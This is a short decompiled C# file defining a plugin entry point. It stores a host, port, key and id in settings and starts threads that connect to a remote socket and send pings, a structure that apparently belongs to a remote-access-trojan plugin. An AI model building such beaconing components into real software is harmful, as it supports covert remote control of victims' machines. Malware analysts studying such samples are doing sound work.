using System;
using System.Diagnostics;
using System.Threading;

namespace Plugin
{
	// Token: 0x02000008 RID: 8
	public class Plugin
	{
		// Token: 0x06000013 RID: 19 RVA: 0x00002244 File Offset: 0x00000444
		public static object Run(string H, string P, string SL, string K, string id)
		{
			try
			{
				Settings.Host = H;
				Settings.Port = P;
				Settings.SPL = SL;
				Settings.KEY = K;
				Settings.IDD = id;
				Plugin.T1.Start();
				Plugin.T2.Start();
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
			object result;
			return result;
		}

		// Token: 0x04000008 RID: 8
		public static Thread T1 = new Thread(new ThreadStart(ClientSocket.BeginConnect));

		// Token: 0x04000009 RID: 9
		public static Thread T2 = new Thread(new ThreadStart(ClientSocket.Ping));
	}
}
